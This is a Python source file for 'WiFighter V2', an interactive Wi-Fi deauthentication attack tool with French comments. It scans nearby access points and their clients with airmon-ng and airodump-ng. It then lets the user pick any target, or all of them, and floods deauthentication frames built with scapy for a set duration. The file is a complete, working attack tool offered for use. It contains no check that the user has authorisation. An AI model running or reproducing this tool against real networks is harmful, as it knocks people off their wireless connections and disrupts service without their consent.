#!/usr/bin/env python3

import argparse
import csv
import glob
import os
import re
import signal
import subprocess
import sys
import time
from threading import Event, Thread
from typing import Dict, List, Optional, Tuple

from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf

conf.verb = 0  # désactiver les messages verbeux de scapy

SCAN_FILE_PREFIX = "wifighter_scan"

# === Couleurs terminal ===
RED = "\033[91m"
YELLOW_BOLD = "\033[1;93m"
RESET = "\033[0m"

# --- Utilitaires ---


def banner() -> None:
    os.system("clear")
    print(f"""{RED}
 __      __.___  _____.__       .__     __                
/  \    /  \   |/ ____\__| ____ |  |___/  |_  ___________ 
\   \/\/   /   \   __\|  |/ ___\|  |  \   __\/ __ \_  __ \\
 \        /|   ||  |  |  / /_/  >   Y  \  | \  ___/|  | \/
  \__/\  / |___||__|  |__\___  /|___|  /__|  \___  >__|   
       \/               /_____/      \/          \/   
{YELLOW_BOLD}
            >>> WiFighter V2 — Deauth Tool by H8Laws  <<<
{RESET}""")


def ensure_root() -> None:
    """Vérifie que le script est exécuté en root."""
    if os.geteuid() != 0:
        print(f"{RED}[-] This tool must be run as root.{RESET}")
        sys.exit(1)


def clean_scan_files() -> None:
    """Supprime les anciens fichiers de scan correspondant au préfixe."""
    for file in glob.glob(f"{SCAN_FILE_PREFIX}-*.csv"):
        try:
            os.remove(file)
        except Exception as e:
            print(f"[-] Error deleting {file}: {e}")


def find_latest_scan_csv() -> Optional[str]:
    """
    Retourne le chemin du dernier fichier CSV généré par airodump-ng
    correspondant au préfixe SCAN_FILE_PREFIX-*.csv.
    """
    files = glob.glob(f"{SCAN_FILE_PREFIX}-*.csv")
    if not files:
        return None
    files.sort(key=os.path.getmtime, reverse=True)
    return files[0]


# === Interfaces ===


def get_interfaces() -> List[str]:
    """
    Récupère les interfaces Wi-Fi présentes via `iwconfig`.
    Retourne une liste d'interfaces (ex: ['wlan0', 'wlan1'])
    """
    try:
        out = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
    except (subprocess.CalledProcessError, FileNotFoundError):
        # Fallback si iwconfig non présent -> essayer ip link
        try:
            out = subprocess.check_output(["ip", "-brief", "link"]).decode()
        except Exception:
            return []

    interfaces = []
    for line in out.splitlines():
        # Ligne commence par "wlan0     IEEE 802.11  ..."
        m = re.match(r"^([^\s:]+)\s+.*IEEE 802.11", line)
        if m:
            iface = m.group(1).strip()
            interfaces.append(iface)
        else:
            # Parfois iwconfig affiche l'interface sur la ligne suivante, tenter heuristique
            parts = line.split()
            if parts and re.match(r"^wlan|^wl", parts[0]):
                interfaces.append(parts[0])
    # uniq
    return list(dict.fromkeys(interfaces))


def enable_monitor_mode(interface: str) -> str:
    """
    Passe l'interface en mode monitor avec airmon-ng.
    IMPORTANT: conformément à la demande, on n'exécute que `airmon-ng start`.
    Aucun `airmon-ng stop` ou tentative d'arrêt automatique n'est faite ici.
    Retourne le nom de l'interface monitor (ex: wlan0mon) si détecté,
    sinon retourne l'interface d'origine.
    """
    print(f"[+] Enabling monitor mode on {interface} (only running 'airmon-ng start')...")
    subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Rechercher l'interface monitor via iwconfig (Mode:Monitor) ou suffixe mon
    try:
        out = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
    except Exception:
        return interface

    mon_iface = None
    for line in out.splitlines():
        if "Mode:Monitor" in line:
            mon_iface = line.split()[0]
            break

    if not mon_iface:
        # fallback: chercher une interface avec suffixe 'mon'
        for line in out.splitlines():
            m = re.match(r"^([^\s:]+) ", line)
            if m and m.group(1).endswith("mon"):
                mon_iface = m.group(1)
                break

    if mon_iface:
        print(f"[+] Monitor interface detected: {mon_iface}")
        return mon_iface
    else:
        print("[-] Unable to detect monitor interface; using provided interface.")
        return interface


def disable_monitor_mode(mon_iface: str) -> None:
    """
    Ne désactive PAS automatiquement le monitor mode (conforme au souhait).
    On affiche juste un rappel informatif.
    Si l'utilisateur souhaite arrêter le mode moniteur, il doit le faire manuellement:
      sudo airmon-ng stop <interface>
    """
    print(f"[!] monitor mode not stopped automatically for {mon_iface} (per user preference).")


# === Airodump ===


def run_airodump(interface: str) -> subprocess.Popen:
    """
    Lance airodump-ng en écrivant CSV avec préfixe SCAN_FILE_PREFIX.
    Retourne l'objet Popen.
    """
    clean_scan_files()
    print("[+] Scanning... (Ctrl+C to stop)")
    # airodump-ng va créer SCAN_FILE_PREFIX-01.csv, -02.csv ... on prendra le plus récent
    proc = subprocess.Popen(
        ["airodump-ng", "-w", SCAN_FILE_PREFIX, "--output-format", "csv", interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return proc


def stop_airodump(proc: subprocess.Popen, timeout: float = 5.0) -> None:
    """Arrête proprement airodump-ng."""
    if proc.poll() is None:
        try:
            proc.send_signal(signal.SIGINT)
            try:
                proc.wait(timeout=timeout)
            except subprocess.TimeoutExpired:
                proc.terminate()
                proc.wait(timeout=timeout)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass


# === Parsing CSV airodump-ng ===


def parse_scan_results(filename: str) -> Tuple[List[Dict[str, str]], Dict[str, List[str]]]:
    """
    Parse le CSV généré par airodump-ng et retourne:
    - aps: liste de dict {bssid, channel, essid, power}
    - clients: dict mapping ap_bssid -> [client_mac, ...]
    Le parsing est robuste face aux variations d'index de colonnes (on utilise les headers).
    """
    aps: List[Dict[str, str]] = []
    clients: Dict[str, List[str]] = {}

    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
        reader = csv.reader(f)
        section = "aps"  # "aps" jusqu'à ce qu'on rencontre "Station MAC"
        headers_map = {}
        for row in reader:
            if not any(cell.strip() for cell in row):
                # ligne vide -> continue
                continue
            first = row[0].strip()
            # détecter début des sections via en-têtes
            if first.startswith("BSSID"):
                # header de la section AP
                section = "aps"
                headers_map = {h.strip(): i for i, h in enumerate(row)}
                continue
            if first.startswith("Station MAC"):
                # header de la section clients
                section = "clients"
                headers_map = {h.strip(): i for i, h in enumerate(row)}
                continue

            if section == "aps":
                # on attend au moins les colonnes BSSID, CH, ESSID, Power (ou PWR)
                try:
                    bssid = row[headers_map.get("BSSID", 0)].strip()
                    channel = row[headers_map.get("CH", 3)].strip() if "CH" in headers_map else row[3].strip()
                    # ESSID colonne parfois "ESSID" ou à la fin
                    essid = ""
                    if "ESSID" in headers_map:
                        essid = row[headers_map["ESSID"]].strip()
                    else:
                        # fallback: prendre la dernière colonne souvent utilisée
                        essid = row[-1].strip()
                    power = ""
                    if "PWR" in headers_map:
                        power = row[headers_map["PWR"]].strip()
                    elif "Power" in headers_map:
                        power = row[headers_map["Power"]].strip()
                    # ignorer lignes vides ESSID
                    if essid == "" or bssid == "":
                        continue
                    aps.append({"bssid": bssid, "channel": channel, "essid": essid, "power": power})
                    clients[bssid] = []
                except Exception:
                    # ignorer malformations
                    continue
            elif section == "clients":
                # colonnes: Station MAC, First time, Last time, Power, Packets, BSSID, Probed ESSIDs
                try:
                    client_mac = row[headers_map.get("Station MAC", 0)].strip()
                    ap_mac = (
                        row[headers_map.get("BSSID", -1)].strip()
                        if "BSSID" in headers_map
                        else (row[5].strip() if len(row) > 5 else "")
                    )
                    if ap_mac and ap_mac in clients:
                        clients[ap_mac].append(client_mac)
                except Exception:
                    continue

    return aps, clients


# === Affichage utilitaire ===


def print_ap_list(aps: List[Dict[str, str]]) -> None:
    print("\n   NUM     ESSID                CH   PWR     BSSID")
    print("  ----  -------------------  ----  ----  -------------------")
    for i, ap in enumerate(aps):
        essid = ap.get("essid", "")[:20]
        ch = ap.get("channel", "")
        pwr = ap.get("power", "")
        bssid = ap.get("bssid", "")
        print(f"   {i+1:<2}   {essid:<20}  {ch:<4}  {pwr:<4}  {bssid}")


# === Attaque deauth ===


def set_channel(interface: str, channel: int) -> None:
    subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def deauth_attack(
    ap_mac: str,
    channel: int,
    interface: str,
    duration: int = 90,
    clients: Optional[List[str]] = None,
    stop_event: Optional[Event] = None,
) -> None:
    """
    Lance une attaque DEAUTH sur un AP et ses clients (si fournis).
    stop_event permet d'interrompre l'attaque depuis l'extérieur.
    """
    print(f"[+] Launching DEAUTH attack on {ap_mac} (CH {channel}) for {duration}s...")
    try:
        set_channel(interface, int(channel))
    except Exception:
        # ignore si conversion échoue
        pass

    packets = []
    pkt_broadcast = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    packets.append(pkt_broadcast)

    if clients:
        for client_mac in clients:
            pkt_to_client = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
            pkt_to_ap = RadioTap() / Dot11(addr1=ap_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth(reason=7)
            packets.extend([pkt_to_client, pkt_to_ap])

    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            if stop_event and stop_event.is_set():
                break
            for pkt in packets:
                sendp(pkt, iface=interface, verbose=0)
            # légère pause pour ne pas saturer CPU totalement
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass

    print("[+] End of the attack.")


# === Main interactive flow ===


def interactive_main(mon_iface: str) -> None:
    # Lancer airodump
    proc = run_airodump(mon_iface)
    try:
        # attendre la capture avec possibilité d'interruption depuis clavier
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Stopping scan...")
        stop_airodump(proc)
        time.sleep(1)

    csv_file = find_latest_scan_csv()
    if not csv_file:
        print("[-] No scan files found.")
        disable_monitor_mode(mon_iface)
        return

    print(f"[+] Using scan file: {csv_file}")
    aps, all_clients = parse_scan_results(csv_file)
    if not aps:
        print("[-] No access point detected.")
        disable_monitor_mode(mon_iface)
        return

    print_ap_list(aps)
    selection = input("\n[+] Select a target (ex: 1 or 1,3 or all): ").strip()
    targets = []
    if selection.lower() == "all":
        targets = aps
    else:
        parts = selection.split(",")
        for part in parts:
            if part.isdigit():
                idx = int(part) - 1
                if 0 <= idx < len(aps):
                    targets.append(aps[idx])

    # durée optionnelle
    try:
        dur = int(input("[?] Duration per target in seconds (default 60): ").strip() or "60")
    except Exception:
        dur = 60

    # Event pour permettre interruption propre des attaques
    stop_event = Event()

    # Handler Ctrl+C pour arrêter les attaques proprement
    def _signal_handler(sig, frame):
        print("\n[+] Stopping attacks...")
        stop_event.set()

    old_handler = signal.signal(signal.SIGINT, _signal_handler)

    for ap in targets:
        clients = all_clients.get(ap["bssid"], [])
        # lancer l'attaque dans un thread pour pouvoir la stopper
        t = Thread(target=deauth_attack, args=(ap["bssid"], ap["channel"], mon_iface, dur, clients, stop_event))
        t.start()
        t.join()
        if stop_event.is_set():
            break

    # restaurer handler
    signal.signal(signal.SIGINT, old_handler)
    disable_monitor_mode(mon_iface)


def main() -> None:
    ensure_root()
    parser = argparse.ArgumentParser(description="WiFighter — DEAUTH tool (refactor)")
    parser.add_argument("--auto", action="store_true", help="Non-interactive mode (not fully implemented)")
    args = parser.parse_args()

    while True:
        banner()
        interfaces = get_interfaces()
        if not interfaces:
            print("[-] No Wi-Fi interface detected.")
            return

        print("[+] Available interfaces:")
        for i, iface in enumerate(interfaces):
            print(f"  {i}. {iface}")

        try:
            choice = input("[?] Choose the interface index (or q to quit): ").strip()
            if choice.lower() in ("q", "quit", "exit"):
                return
            idx = int(choice)
            if not (0 <= idx < len(interfaces)):
                print("[-] Invalid choice.")
                time.sleep(1)
                continue
            iface = interfaces[idx]
        except Exception:
            print("[-] Invalid input.")
            time.sleep(1)
            continue

        # Activer monitor mode (uniquement 'airmon-ng start')
        mon_iface = enable_monitor_mode(iface)

        # mode interactif principal
        interactive_main(mon_iface)

        again = input("\n[?] Restart a scan ? (y/n) : ").strip().lower()
        if again != "y":
            break


if __name__ == "__main__":
    main()